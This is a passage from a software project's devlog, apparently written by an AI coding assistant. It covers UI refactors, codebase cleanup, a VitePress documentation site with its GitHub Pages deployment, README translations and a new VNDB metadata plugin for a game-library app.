**Discussed whether translation should become a plugin - decided no, stayed host-native.** User
asked directly. Answer: this app's plugin architecture (source/theme/metadata/controller) is a
WASM-sandboxed model (wasmtime, no subprocess spawn, no arbitrary binary download) - translation
needs raw process spawn (`llama-server.exe`), app-data filesystem writes, and a long-lived
background task with idle-timeout logic, none of which fits a WASM guest sandbox. It also
doesn't map onto any of the 4 existing plugin kinds. This was already the original Milestone 20
design decision (host-native module chosen specifically because a heavy inference-adjacent
feature doesn't fit the sandbox model) - reaffirmed here, not revisited, since nothing changed
that would make third-party-swappable translation implementations a real need.

**Follow-up: replaced the per-tier radio-button list with a single dropdown + one status
button.** User asked for this UI change directly - `AppSettings.vue`'s model picker previously
rendered one `<label>` row per tier (radio input, name/subtitle, size, its own download/remove/
downloading button) in a `.model-list`. Replaced with a single `<select>` (one `<option>` per
tier, name/subtitle/size all in the option text) plus one status/action button that now tracks
whichever model is currently selected via a new `selectedModel` computed
(`translation.models.find(m => m.id === translation.selectedModelId)`). The button's own
three-way branch (Remove/Downloading.../Download) is unchanged logic, just reading
`selectedModel.id` instead of a per-row `model.id` - selecting a different option in the
dropdown makes the button immediately reflect that model's real install state, matching what was
asked ("the button next to it should follow the selected model's installation status"). Removed
the now-dead `.model-list`/`.model-info`/`.model-subtitle` CSS rules, added `.model-select`
(`flex: 1`) and a small `.model-row-spaced` margin between the engine row and the model row
(previously supplied by `.model-list`'s own `margin-top`, lost when that wrapper was removed).
`bun run build` clean.

**Follow-up: replaced the native `<select>` with a custom dropdown shaped like `GameDetail.
vue`'s translate-menu.** User wanted title/subtitle on two left-aligned lines, not coupled into
one "Name — subtitle" string - a native `<select>`'s `<option>` elements can only render plain
single-line text, no per-line styling, so the `<select>` had to go entirely rather than be
tweaked. Rebuilt as a button trigger (`.model-menu-trigger`, showing the selected model's name/
subtitle stacked, plus an `IconChevronDown`) + an absolutely-positioned panel
(`.model-menu`) + a full-viewport invisible `.model-menu-backdrop` that closes it on outside
click - the exact same 3-piece shape `GameDetail.vue`'s `.translate-menu-wrap`/`.translate-menu`/
`.translate-menu-backdrop` already established, reused rather than inventing a different pattern
for what's conceptually the same kind of control. Each `.model-menu-item` shows name/subtitle
stacked on the left (`.model-menu-item-info`, `flex-direction: column`) and size on the right,
with an `.active` highlight for the currently-selected tier. `selectModel(modelId)` calls the
existing `translation.setSelectedModel` then closes the menu, mirroring `onToggleTitleView`
etc.'s "act then close" shape in `GameDetail.vue`. `bun run build` clean; confirmed
`IconChevronDown` resolves via the build itself rather than grepping the icon package's file
list (Tabler's icon file naming under `@tabler/icons-vue` didn't match a simple `find` pattern).

**Follow-up: extracted the shared trigger/panel/backdrop shell into `DropdownMenu.vue`, wired
both `AppSettings.vue`'s model picker and `GameDetail.vue`'s translate menu through it.** User
asked whether the just-hand-built shape should become a shared component, since they wanted the
same design for the locale picker too - confirmed both existing dropdowns (model picker,
translate menu) were the only two hand-built instances of this shape before extracting.

Deliberately extracted only the *shell* - open/close state, trigger slot, absolute panel,
backdrop-to-close - not the panel *content*. `AppSettings.vue`'s menu is a real value-picker
(flat item list, each item selects one id); `GameDetail.vue`'s is a multi-group action carousel
(paged via wheel/arrow-keys, animated transition, dot indicator, several differently-disabled
buttons per group). Forcing both through one API with slots for grouping/paging/dots would have
bloated the shared component for a single caller's edge case - flagged this distinction directly
to the user rather than building an overly generic one-size-fits-all dropdown.

New `src/components/desktop/common/DropdownMenu.vue` (added to that folder's existing barrel,
alongside `BaseModal`/`InstallableStatus`/`ToastContainer`): `open`/`update:open` v-model prop,
`#trigger` scoped slot (receives `open`/`close`), default slot for panel content (receives
`close`), plus `wheel`/`keydown` events re-emitted from the panel element itself (not relied on
via Vue's attrs-fallthrough, which only reaches a child component's *root* node, not arbitrary
internal elements) so `GameDetail.vue` can still page groups while listening from outside. A
`focusPanel()` method is exposed via `defineExpose` for the same reason - `GameDetail.vue` needs
to focus the actual panel DOM node right after opening so arrow keys land on it, and that node
lives inside the child's own template. `wrapClass`/`panelClass` props let each caller add its
own width/positioning overrides on top of the shared chrome (background/border/radius/shadow/
overflow/flex-column, all now living once in `DropdownMenu.vue` instead of duplicated in both
callers).

Ran into a real Vue scoped-CSS subtlety while wiring `panelClass`: Vue's scoped-CSS mechanism
only gives a *child component's root element* the parent's own scope attribute (specifically so
a parent can style a child's root via plain scoped selectors) - it does **not** extend that to
arbitrary non-root elements inside the child's template, even ones a parent passed a custom
class name to via a prop. The panel div lives inside `DropdownMenu.vue`'s own template, not at
its root (the root is the wrap div) - so a plain `.model-menu-panel { right: 0; }` in
`AppSettings.vue`'s scoped style silently failed to match anything. Fixed by anchoring on the
wrap element (which *does* carry the parent's scope attribute, being the child's root) and using
`:deep()` to reach the panel: `.model-menu-wrap :deep(.model-menu-panel) { right: 0; }` in
`AppSettings.vue`, `.translate-menu-wrap :deep(.translate-menu) { min-width: 220px; }` in
`GameDetail.vue` - same fix applied to both consumers once the root cause was understood, not
patched ad hoc per file.

`GameDetail.vue`'s `menuEl` ref changed from a plain `HTMLElement | null` (previously pointing
directly at the `.translate-menu` div) to `InstanceType<typeof DropdownMenu> | null`, and
`openTranslateMenu`'s focus call changed from `menuEl.value?.focus()` to
`menuEl.value?.focusPanel()` - everything else in that file (group paging, wheel/keydown
handlers, the animated transition, dot indicators) untouched, since only the shell moved.
`bun run build` clean on both files; a repo-wide grep confirms no leftover `.translate-menu-
backdrop`/`.model-menu-backdrop` CSS rules survived the move (backdrop styling now lives only
in `DropdownMenu.vue`, with no consumer-side override needed by either caller).

**Follow-up: fixed low-contrast text on the selected model item under a "brick"-style theme.**
User reported the `.model-menu-item.active` highlight reading dark/hard-to-read under a
specific theme. Root cause: that rule filled the selected item's background with `--color-
surface1` while leaving text at `--color-text` unchanged - a theme can set `--color-surface1`
independently dark/saturated (tuned against `--color-base`/`--color-surface0`'s own lightness,
not against `--color-text`), so nothing here previously guaranteed the two would stay readable
together. Fixed by deriving the highlight from `currentColor` instead of a fixed surface token -
`background: color-mix(in srgb, currentColor 12%, transparent)` - a low-opacity tint of the
text's own color, which by construction can never clash with that same text regardless of what
a given theme's surface tokens happen to be set to. `bun run build` clean.

**Follow-up: added a top-level `<h2>` panel title to `AppSettings.vue`, matching every other
tab.** User asked which heading level this project prefers (`h2` vs `h3`) - answered from the
existing convention already in the codebase rather than picking arbitrarily: every other tab
(`CollectionsPanel.vue`, `PluginSettings.vue`, `TagsPanel.vue`, `UiTest.vue`) uses `h2` for its
own top-level panel title, while `h3` is reserved for sub-sections within a panel
(`StatsPanel.vue`'s "Most Played"/"Recently Played"). `AppSettings.vue`'s existing `h3` for
"Offline Translation" was already correct under this convention (a sub-section, not the panel's
own title) - but the panel had no top-level `h2` title at all, unlike every sibling tab.

Added one, reusing the already-existing `common.settings` i18n key ("Settings") rather than
creating a new `settings.heading` key duplicating that same string. Wrapped in a `.sticky-header`
div (the same shared global class `CollectionsPanel.vue`/`TagsPanel.vue` already use for their
own `h2`) rather than a bare `<h2>`, so it gets the same sticky-on-scroll behavior and spacing as
every other tab's title for free. Had to add the `panel` class alongside the existing `settings-
panel` class on the root div too - `styles.css`'s `.panel.settings-panel { padding-top: 0; }`
rule (a compound selector, only fires when *both* classes are present) exists specifically to
cancel `.settings-panel`'s own `padding-top` once `.sticky-header` starts supplying that same gap
itself; without also adding `panel`, the page would have gotten double top padding (once from
`.settings-panel` alone, once from `.sticky-header`). `bun run build` clean.

**Follow-up: fixed vertical misalignment between "Plugins" and the "Add Plugin" button.**
`.plugin-settings-header` already had `align-items: center` and the `h2` already had `margin-
bottom: 0` zeroed, but a browser-default `margin-top` on `h2` was never reset - since flex
alignment considers an item's full margin box, that leftover top margin nudged the heading's box
down relative to the button, which has no such margin. Zeroed `margin` entirely on the `h2`
instead of just `margin-bottom`, and switched the container from `align-items: center` to
`align-items: baseline` - `center` aligns the two elements' boxes, not their actual text, so a
1rem heading next to a smaller-font button can still look off-center even with zero margins;
`baseline` lines up the real text baselines instead, which is what "align the title with the
button's text" actually means here. `bun run build` clean.

**Follow-up: updated README.md and the docs site for the now-fully-closed Milestone 20.** Both
had gone stale across this whole translation-feature session - README's Status section still
said "10-language localization (Milestone 20, UI strings only so far)" and separately listed
"an offline LLM-based translation feature for game descriptions (Milestone 20's remaining half)"
under Open work, and the docs site (`docs/guide/`) had zero mentions of translation anywhere,
despite the feature now being fully built (engine download, 4 model tiers, per-field translate/
show/revoke, persisted per-game state).

README: added a dedicated "Offline translation" bullet to the Features list (on-device, no
external service, model tiers including the uncensored one, per-field independence, persistence/
invalidation rules) and folded Milestone 20 into the Status paragraph's "done" list instead of
its own "open work" callout, removing the now-stale "UI strings only so far"/"remaining half"
qualifiers entirely.

`docs/guide/library.md` gained a full "Offline translation" section (the natural home - a
game-level feature, same file as Editing/Tags/Dedup) covering the 3-group dropdown (translate/
show/remove), the Settings one-time setup (engine + model download), the model-tier tradeoff
(size/RAM/speed, one uncensored tier), and the locale/edit invalidation rule - written for an end
user, not a developer, matching this file's existing voice (no Rust/DB internals, no mention of
`translated_locale` or migration numbers). `docs/guide/index.md`'s "Where things live" Settings
bullet got a one-line pointer to that new section rather than duplicating any of its content.

Verified with a real docs build (`cd docs && bun run docs:build`), not just a visual read of the
markdown - completed clean (pre-existing unrelated "language 'wit' is not loaded" warnings only,
same ones every previous docs build in this project has produced).

## Milestone 14 — UI Polish (Continuous, ongoing) — post-close addition

**`src/components/desktop/`'s loose `.vue` files sorted into `game/`/`shell/`/`common/`
subfolders, matching the existing `modalForms/`/`tabs/` convention.** User asked directly for
this cleanup. 10 files had no subfolder at all, sitting flat alongside `modalForms/`/`tabs/`:
- `game/` - `GameCard.vue`, `GameListRow.vue`, `GameDetail.vue`, `SkeletonCard.vue`,
  `SkeletonRow.vue` (grouped since all five render "a game" in some form - grid card, list row,
  full detail page, and the two's loading skeletons)
- `shell/` - `TitleBar.vue`, `NavSidebar.vue` (app chrome, not tied to any one view)
- `common/` - `BaseModal.vue`, `ToastContainer.vue`, `InstallableStatus.vue` (generic reusable
  primitives with no game/settings-specific content of their own)

Used `git mv` (not delete+recreate) to preserve file history through the move. Every relative
import inside the 5 moved files that reached up to `stores/`/`composables/`/`theme/`/`plugins/`/
`db` needed its `../../` bumped to `../../../` (one extra folder level) - `TitleBar.vue`/
`NavSidebar.vue`/`BaseModal.vue`/`SkeletonCard.vue`/`SkeletonRow.vue` had no such imports to fix.
Then updated every external reference: `App.vue` (`TitleBar`/`NavSidebar`/`ToastContainer`/
`GameDetail`), `plugins/loader.ts` (`InstallableStatus`), all 5 `modalForms/*.vue` files
(`BaseModal`), and `tabs/GameGrid.vue`/`tabs/GameList.vue` (`GameCard`/`SkeletonCard`/
`GameListRow`/`SkeletonRow`). Verified with a repo-wide grep for the old bare paths (zero
matches left) before rebuilding. `bigpicture/`'s 3 files (`BigPictureTile`/`BigPictureGrid`/
`BigPictureSlideshow`) left as-is - already their own dedicated top-level folder per `CLAUDE.md`'s
desktop/Big-Picture split, not loose the way the moved 10 were. `bun run build` clean, no
behavior change - pure file reorganization.

**Immediate follow-up: `@/` path alias, since the reorg above made `../../../` chains worse.**
User asked directly for a way to shorten these as more subfolders get introduced. Standard Vite/
TS fix: `vite.config.ts` gained `resolve.alias` mapping `"@"` to `fileURLToPath(new URL("./src",
import.meta.url))`; `tsconfig.json` mirrors it via `baseUrl: "."` + `paths: { "@/*": ["src/*"] }`
so `vue-tsc`/editor tooling resolves it too, not just Vite's own bundler.

Rewrote every existing `../`-style import to the new alias with a small one-off Node script
(`alias-imports.mjs`, scratch dir, not committed) rather than a blind `sed` - a regex swap can't
correctly resolve what each `../` chain actually points at relative to its own file's directory,
so the script: walks every `.ts`/`.vue` file under `src/`, regex-matches each quoted import
specifier starting with `../`, resolves it to an absolute path via `path.resolve(fileDir, spec)`,
computes its path relative to `src/` itself, and rewrites the specifier to `@/<that path>` - a
correct per-file resolution, not a naive string substitution. Deliberately left plain `./sibling`
imports untouched (already short, no benefit to aliasing them) and only targeted specifiers
literally starting with `../` (one or more levels). 42 files, 119 import specifiers rewritten in
one pass. Verified zero `../`-style imports remained via a repo-wide grep afterward, then
confirmed `bun run build` (`vue-tsc --noEmit` + `vite build`) stayed clean - the type-check
passing confirms the alias resolves correctly for TypeScript, not just Vite's runtime bundler.

**Follow-up: `tsconfig.json`'s `baseUrl` flagged deprecated by the editor.** Recent TypeScript
resolves `paths` relative to the tsconfig file's own directory without needing `baseUrl` at all
- but doing that requires each `paths` value to start with an explicit `./` (`TS5090: Non-
relative paths are not allowed when 'baseUrl' is not set` otherwise). Removed `baseUrl: "."`,
changed `"@/*": ["src/*"]` to `"@/*": ["./src/*"]`. `bun run build` clean.

**Follow-up: a `noUnusedLocals`/`ts(6133)` false positive on `GameCard.vue`'s `balloonEl`.**
`useBalloonAnchor` created its own `balloonEl` ref internally and returned it purely so the
calling component could bind it via `ref="balloonEl"` in the template - inverted from `cardEl`'s
pattern (created in `GameCard.vue`, passed into the composable), which apparently some tooling's
unused-variable analysis can't see through (a plain string `ref="name"` template binding doesn't
always get recognized as "reading" a destructured composable return, even though Vue's actual
compiler handles it correctly at runtime - `bun run build` never flagged it, this was purely an
editor/language-server-level diagnostic). Fixed at the root: `useBalloonAnchor`'s signature now
takes both `cardEl` and `balloonEl` as parameters instead of creating/returning `balloonEl`
itself; `GameCard.vue` creates both refs locally, matching `cardEl`'s existing, already-correct
ownership model. `bun run build` clean.

**Follow-up: grouped imports per file (external packages, blank line, then internal).** Another
one-off Node script (`group-imports.mjs`), needed because a blind per-line regex can't correctly
handle multi-line import statements (destructured type-only imports spanning several lines) or
tell where one import statement ends and the next begins once wrapped. First pass had a real
bug: each import's own trailing newline was being mis-attributed as a "blank line" belonging to
the *next* statement's prefix rather than to itself, so inserting a separator blank line between
groups produced a double blank line everywhere. Fixed by making the statement-splitter consume
exactly one trailing line terminator into the statement it just closed, so each unit always owns
its own newline and the group separator only ever adds exactly one more. Verified via a git diff
scan for the expected count (40 added lines, one per touched file, no doubles) before committing.
Reran on 40 files; `bun run build` clean, order within each group and every comment's attachment
to its own import preserved.

**Follow-up: App.vue's ~30-line import block, on request - barrel `index.ts` files instead of
an auto-import plugin.** Presented both real options before touching anything: barrel files
(explicit, no new dependency, matches this codebase's already-very-explicit style) vs.
`unplugin-vue-components`/`unplugin-auto-import` (zero import lines at all, but two new build
dependencies and convention-based magic that cuts against how deliberately explicit/documented
everything else here already is). User picked barrels. Added `index.ts` to `stores/` (`export *
from "./file"` per store - verified no export-name collisions across all 14 store files first)
and to every `components/desktop/` subfolder plus `components/bigpicture/` (`export { default as
Name } from "./File.vue"` per component, since `.vue` SFCs have a default export, not named
ones - `shell/index.ts` also re-exports `NavSidebar.vue`'s named `AppView` type the same way).
`App.vue`'s own store-only-and-component-only imports collapsed from ~24 individual lines to one
import per directory (8 total). `tabs/index.ts`'s own comment calls out why `UiTest.vue` still
isn't routed through it despite living in that folder: `App.vue`'s existing `import()` for it is
a deliberate code-split point (gated by `import.meta.env.DEV`, dropped entirely from production
builds) - a dynamic `import()` naming a barrel-exported binding pulls in the whole barrel's
module graph statically, which would silently defeat that split. `bun run build` clean.

**Follow-up: asked whether `src-tauri/` needed the same kind of cleanup.** Investigated rather
than assuming symmetry with the frontend - Rust's `use`-statement grouping/alphabetization is
already `rustfmt`-enforced (unlike TS/Vue, which has no built-in equivalent), so nothing to do
there; `wasm_plugins.rs`/`plugin_installer.rs` are the two largest files (818/873 lines) but each
stays on one coherent, already-documented concern rather than being a genuinely mixed grab-bag
the way the frontend's loose `.vue` files were, so left unsplit. Three real, low-risk findings
instead:
- `cargo fmt --check` failed on 7 of 9 files (`db.rs`, `launcher.rs`, `plugin_installer.rs`,
  `plugin_verification.rs`, `wasm_plugin_runtime.rs`, `wasm_plugins.rs`) - drifted from canonical
  `rustfmt` style (mostly `vec![Migration { ... }, Migration { ... }]`-shaped layout). Fixed with
  a plain `cargo fmt` run, zero logic risk.
- `wasm_plugin_runtime.rs` had a stray UTF-8 BOM at the very start of the file - harmless to the
  compiler but inconsistent with every other file. Turned out `cargo fmt` itself stripped it as
  a side effect of reformatting, so no separate fix was needed.
- `lib.rs` still registered the `greet` command (`"Hello, {name}! You've been greeted from
  Rust!"`) - leftover `create-tauri-app` scaffold, confirmed via a frontend-wide grep for any
  `invoke("greet")` call (zero hits) before deleting both the function and its
  `generate_handler!` registration.

`cargo check` and `bun run build` both clean after all three fixes.

## Milestone 21 — Plugin-Developer Documentation Site

User wants real documentation (wiki-style), and was asked which audience first - plugin
developers or end users. Recommended developer docs: the WASM plugin system (Component Model,
WIT interfaces, capability gating, manifest schema, signing/registry) is genuinely complex and
currently only exists in scattered form across `.claude/CLAUDE.md`/`devlog.md`, neither of which
a third-party plugin author would ever read, whereas the app's own UI is comparatively
self-explanatory. User agreed.

Also asked directly about *method* - GitHub Wiki vs GitHub Pages vs something else. Recommended
against the Wiki: it's a separate, unreviewed git repo that can silently drift out of sync with
the actual interface the moment someone changes `wit/plugin.wit` without also remembering to
edit a wiki page living somewhere else entirely. Recommended docs-as-code instead: a normal
`docs/` folder on `main`, reviewed via the same PR flow as everything else, built with VitePress
(fits the existing Vue/bun stack, no new tooling paradigm to learn) and deployed to GitHub Pages
via GitHub Actions - explained the actual mechanics when asked ("do you create a new branch") -
source lives in a normal directory on `main`; only the *built* static output needs Pages, via
the modern `upload-pages-artifact`/`deploy-pages` action pair rather than an old-style
`gh-pages` branch.

Went through `EnterPlanMode` given the scope (new directory structure, new dependency, a new
CI workflow, real content across 7 pages) before touching anything.

**Structure**: `docs/` is its own bun project - separate `package.json`/`bun.lock` from the
root app's, so VitePress's own dependencies never touch Tauri's frontend build or its dev-server
port. `docs/.vitepress/config.ts` defines nav/sidebar/local search; content:
- `index.md` - VitePress's home-layout landing page
- `plugins/index.md` - architecture overview: the five plugin kinds (source/theme/metadata/
  controller/wrapper), the three authoring tiers (built-in TS / WASM / data-only theme), and
  *why* WASM specifically (capability-scoped sandboxing a native binary or unsandboxed script
  can't offer - both were considered and rejected for exactly that reason per this repo's own
  history)
- `plugins/getting-started.md` - a full walkthrough building a minimal WASM source plugin,
  built directly from the real, working reference plugin already in this repo
  (`examples/exe-scanner-plugin`) rather than an invented toy example - same Rust code, same
  `cargo-component` toolchain steps, same "drop the `.wasm` + `plugin.json` into `<app data
  dir>/wasm-plugins/source/<id>/`" manual-test instructions its own README already documents
- `plugins/manifest-reference.md` - every `PluginManifest` field (`src/plugins/manifest.ts`),
  grouped by core/theme-specific/WASM-specific/host-added, with the versioning convention from
  `CLAUDE.md`'s own "Plugin Versioning" section
- `plugins/wit-interface.md` - the actual `src-tauri/wit/plugin.wit` contract, host functions
  grouped by category (registry/filesystem/process/network/zip/scoped-storage) plus all three
  plugin worlds (`source-plugin-world`/`wrapper-plugin-world`/`metadata-plugin-world`) - written
  from that file directly, called out as authoritative if the two ever disagree
- `plugins/security-model.md` - wasmtime sandboxing, path scoping (static + runtime-requested),
  the `run-programs` capability gate, network scoping, then honestly separating what sandboxing
  solves (what a plugin can *reach*) from what it doesn't (whether the code *itself* is
  malicious within that reach) - code signing (advisory) and the curated registry (hard-gated,
  hash-pinned) as the two answers to that second problem
- `plugins/publishing.md` - freeform install-by-URL (always available, no gatekeeping) vs. the
  curated registry, sourced directly from `concourse-plugin-registry`'s own README rather than
  overstating it as an open community-submission process - that README explicitly says review
  today means one person (the maintainer) reading pinned versions, not a moderated PR queue,
  and this page says the same honestly rather than promising more than currently exists

Verified locally before writing the deploy workflow: `cd docs && bun add -d vitepress` (pinned
1.6.4, matching what was hand-written into `package.json` first), then `bun run docs:build` -
succeeded with only a cosmetic warning (Shiki, the syntax highlighter, has no bundled grammar
for `wit`, so those code fences fall back to plain-text highlighting - functional, just not
colorized).

**Deploy workflow** (`.github/workflows/docs.yml`) mirrors `release.yml`'s existing conventions
(`actions/checkout@v6`, `oven-sh/setup-bun@v2`) - triggered on push to `main` touching `docs/**`
or the workflow file itself, plus `workflow_dispatch`. Two jobs: `build` (installs docs'
dependencies, runs `docs:build`, uploads `docs/.vitepress/dist` via `upload-pages-artifact@v3`)
and `deploy` (`deploy-pages@v4`, gated on `build` via `needs`) - the modern GitHub-recommended
pattern needing `pages: write`/`id-token: write` permissions, no `gh-pages` branch anywhere.

Added `.vitepress/cache` to the root `.gitignore` (VitePress's own build cache dir - `dist`,
`node_modules`, and `bun.lock` were already covered by existing repo-root patterns, so those
needed no change). Verified via `git add -n docs/` before actually staging anything that exactly
the 9 real source files would be staged - no accidental `node_modules`/`dist`/lockfile.

**One thing left outside my own reach**: GitHub Pages isn't enabled for this repo yet (checked
via `gh api repos/smh0505/Concourse/pages` - 404, confirmed before writing the workflow rather
than assuming). Flagging this directly rather than attempting to toggle a public-facing repo
setting myself - someone with repo admin access needs to set Settings → Pages → Source to
"GitHub Actions" once, after which this workflow's future runs will actually publish somewhere
reachable.

End-user documentation (install/usage guide) deliberately not started this pass - developer
docs were the explicitly agreed priority; user docs are a distinct, separate follow-up.

**Follow-up: GitHub Pages enabled, action versions bumped, end-user guide added.** User flipped
the one manual setting (Settings → Pages → Source → "GitHub Actions") and confirmed the
workflow ran successfully - `gh api repos/smh0505/Concourse/pages` now returns a live
`html_url` (`https://smh0505.github.io/Concourse/`).

Also asked to bump `upload-artifact`/`deploy-pages` versions - checked actual current tags via
`gh api repos/actions/upload-pages-artifact/tags`/`.../deploy-pages/tags` rather than guessing;
both had a `v5` major tag available even though the request named `v4` specifically. Bumped to
the literally-requested `v4` first (`upload-pages-artifact` was still on `v3`;`deploy-pages` was
already `v4`), then bumped both to `v5` on a follow-up request once the `v5` availability was
flagged.

**Then continued to the last open Milestone 21 item**: end-user docs, under a new `docs/guide/`
section (separate VitePress sidebar/nav entry, "User Guide", alongside "Plugin Docs" - the
landing page's hero actions now link to both). Four pages, each grounded in the actual current
app behavior rather than generic filler:
- `guide/index.md` - install instructions (release page, auto-update - no manual re-download
  needed), first-run overview (manual add vs. source-plugin scan), a map of where things live
  in the sidebar (Library/Stats/Tags/Collections/Settings)
- `guide/library.md` - adding games both ways, editing/Fetch Metadata, tags vs. collections as
  genuinely separate concepts (not "collections are just another tag"), how cross-source
  deduplication actually works (title-matched, source-plugin priority order decides the winner,
  `skip_dedup` opts a specific entry out), and the URI-launch vs. direct-executable playtime-
  tracking distinction from `CLAUDE.md`'s own "Process Launching & Playtime Tracking" section
- `guide/plugins-and-themes.md` - the user-facing half of the Settings panel: installing via
  the curated registry vs. a pasted manifest URL (and what hash-verification actually buys you
  in the registry case), multi-enable-and-order vs. exclusive-select semantics per kind, the
  four automatic update-check moments, uninstalling
- `guide/big-picture.md` - entering/exiting, controller-mapping-plugin-driven navigation
  (a different controller is a different plugin selection, not a settings screen to hand-tune),
  auto-launch-on-boot, the slideshow view

Verified every internal cross-link (`grep`-collected every markdown link across all `.md`
files, checked each resolves to a real file, and manually confirmed every `#anchor` fragment
matches its target heading's actual generated slug) before considering this done - VitePress
doesn't validate links/anchors at build time by default, so a broken one would otherwise ship
silently. `bun run docs:build` clean (same cosmetic `wit`-language Shiki warning as before, no
new errors).

**Follow-up: a skeleton placeholder for content updating in `GameDetail.vue`.** `fetchMetadata()`
(`stores/library.ts`) can overwrite description, release date, cover art, background art, and
tags, but its own trigger ("Fetch Metadata") only exists in the edit-mode action bar - meaning
`fetchingMetadata` can never be true while the view-mode block (title/meta/description) is even
rendered, only while the edit-form is showing. The one element that renders regardless of edit
state is `.cover-wrap` (sits above the `v-if="!editing"`/`v-else` split), and it's also
literally the one field every existing skeleton in this codebase (`SkeletonCard.vue`,
`SkeletonRow.vue`) already skeletons - so gave it the same treatment here rather than inventing
a new pattern: a `.cover-skeleton` div (same shimmer/background/border recipe as those two)
swapped in ahead of the real `<img>`/placeholder via a `v-if="fetchingMetadata"` branch. Reuses
the already-shared `.shimmer`/`@keyframes shimmer` from `styles.css` rather than duplicating the
animation. `bun run build` clean.

**Correction: the skeleton the user actually meant was `textPending`, not `fetchingMetadata`.**
Clarified directly - they meant the window while the backdrop image has loaded but its
brightness/`wantsReverse` hasn't resolved yet (`useImageBrightness`'s `isReady`), which
previously had zero visual feedback at all: `.info.text-pending { color: transparent; }` simply
made the title/meta/description invisible rather than showing anything resembling a loading
state (chosen originally just to avoid a color-flash, not as a real skeleton). Replaced that rule
with three real skeleton elements (`.skeleton-title`/`.skeleton-meta`/`.skeleton-desc` x3, one
`.short`), shown via a new outermost `v-if="textPending"` branch ahead of the existing `v-else-
if="!editing"`/`v-else` (edit-form) split - sized/spaced to roughly match the content they stand
in for (title ~2.2rem tall/60% wide, meta ~1rem/40%, three description lines tapering to 65%),
so swapping to the real elements once brightness resolves causes minimal layout jump. Reuses the
same shared `.shimmer` class as the cover skeleton above, not a new animation. Also covers the
`fetchingBackground`-triggered re-fetch case for free, since changing `background_art_url`
re-triggers `useImageBrightness` and thus `textPending` the same way initial navigation does -
no separate handling needed for that path. `bun run build` clean.

## Milestone 22 — Docs Site Internationalization

User asked whether the docs site (Milestone 21) could get i18n like the app's own UI (Milestone
21's 10 languages). Checked feasibility directly against this project's actual pinned VitePress
version (`docs/package.json` → `1.6.4`) rather than assuming from general VitePress knowledge -
1.6.4 does support i18n natively, via a `locales` key in `.vitepress/config.ts` plus per-locale
content subdirectories, with a locale switcher built into the default theme.

Deliberately scoped as its own milestone (23) rather than treated as a quick follow-on to 21 or
22, and said so directly to the user: the docs site currently has 12 real pages
(`docs/index.md`, 5 under `docs/guide/`, 7 under `docs/plugins/`, per `config.ts`'s own nav/
sidebar), all prose-heavy technical/developer content with code samples - translating all of
them into the app's same 9 non-English locales would be 108 translated files, a categorically
bigger and higher-mistranslation-risk task than the app's own UI-string localization (which was
short button/label text, forgiving of an imperfect machine translation). Recorded as `[ ]`
unstarted in `milestones.md`, with the real open questions before starting: how many locales
(same 10 as the app, or fewer to start), machine-translated (same disclosed approach as the
app's 9 locales) vs. holding out for native-speaker review given the higher stakes of technical
docs, the actual VitePress config/URL-structure work (`locales` key, per-locale `themeConfig`
nav/sidebar overrides, confirming the locale switcher and generated links behave under this
project's `base: "/Concourse/"` GitHub Pages path), and confirming `docs.yml`'s existing build/
deploy workflow handles VitePress's multi-locale output structure without changes. Not started
this pass - scoping only, per this project's own "one step at a time" convention already
followed for every other milestone.

**Immediate follow-up, same session: while docs-site i18n stays scoped/unstarted, translated
the top-level README instead.** User asked to i18n the README specifically, distinct from the
Milestone 22 docs-site scope above - a single file, not 12 pages, so no milestone entry needed
for this one; just done directly. Added `README.<locale>.md` for all 9 non-English UI locales
(`ko`/`ja`/`zh-Hans`/`es`/`fr`/`de`/`pt-BR`/`ru`/`it`), each a full translation of every
section (Features through the new Third-Party Notices), machine-translated - same disclosed
approach already used for the app's own UI strings, stated explicitly at the top of each
translated file rather than left implicit. Every file (including `README.md` itself) gained a
language-switcher line linking to all the others, plus the disclosure note. Code blocks,
inline code (package/command names, CSS variables, file paths), and every URL were left
untouched across all 9 translations - only prose was translated. `README.md`'s own switcher
line links to `#features` for the disclosure note's "see Localization below" reference; each
translated file's equivalent anchor points at that file's own translated heading text (e.g.
`#기능`, `#功能`, `#funcionalidades`), which is what GitHub's anchor-slugger actually generates
from each file's real heading, not a hardcoded English slug reused everywhere.

**Immediate follow-up: moved the translated READMEs into a `readme/` folder.** User asked to
keep them distinct from `docs/` (the VitePress docs site), so the 9 `README.<locale>.md` files
moved into a new top-level `readme/` folder - `README.md` itself stays at repo root, since
GitHub requires it there to render the repo's own homepage. Fixed every cross-link: the root
README's switcher now points into `readme/`; each translated file's link back to English and to
`LICENSE`/`.claude/*`/`docs/` now goes through `../`, since those files sit one directory deeper
than before. Sibling links between the 9 translated files needed no changes, since they all
moved together and stayed in the same directory relative to each other.

**New official plugin: `vndb-metadata-wasm-plugin`.** User first asked about a SteamDB plugin -
checked directly rather than assuming it'd be fine: SteamDB's own FAQ explicitly prohibits
scraping and they have no public API at all (their own data comes from Steam's official APIs
and store pages), so declined building that specifically rather than building a scraper against
an explicit anti-scraping policy. User then asked about VNDB instead - checked that one for
real too rather than assuming: VNDB's official Kana API v2 (`api.vndb.org/kana`) is genuinely
public, documented, and needs no API key for this level of use - confirmed with live
`curl -X POST` requests against the real endpoint (both a fuzzy `search` filter and an exact
`id` filter) before writing a single line of plugin code, not just trusting the docs existed.

Scaffolded a brand-new repo (`smh0505/vndb-metadata-wasm-plugin`, created via `gh repo create`)
rather than vendoring it into this main repo - same reasoning every other official plugin
already documents (a plugin whose source lives inside the host app's own repo doesn't
genuinely exercise the "install arbitrary third-party code" model the WASM system is for).
Used `thegamesdb-metadata-wasm-plugin` as the structural template (fetched its real files via
`gh api .../contents/...` rather than guessing the shape from memory): identical `wit/
plugin.wit` (the host interface is shared verbatim across every plugin repo, not
per-integration), the same `.github/workflows/publish.yml` CI (build → stage → Sigstore attest
→ publish release → notify `concourse-plugin-registry` via repository-dispatch), the same
`.gitignore`/`.vscode/settings.json`. `src/bindings.rs` is machine-generated by `wit-bindgen`
but checked into git in every one of these repos (not gitignored) - copied that file byte-for-
byte from TheGamesDB's repo rather than attempting to regenerate it locally, since it's
identical whenever the WIT interface is identical.

`src/lib.rs` itself is new: `search_candidates` uses VNDB's `search` filter then applies the
same exact-case-insensitive-title filter `rawg-metadata-wasm-plugin`/`thegamesdb-metadata-wasm-
plugin` already established (VNDB's own search is fuzzy, not exact); `fetch_metadata_by_id`
uses an `id` filter for the full detail lookup. No `settingsSchema` in `plugin.json` at all -
first metadata plugin in this project that needs zero configuration, since VNDB's API requires
no key for this usage level. Deliberately fills `genres: []` unconditionally rather than
mapping anything from VNDB's own tag data - VNDB's tags are a large, freeform, community-
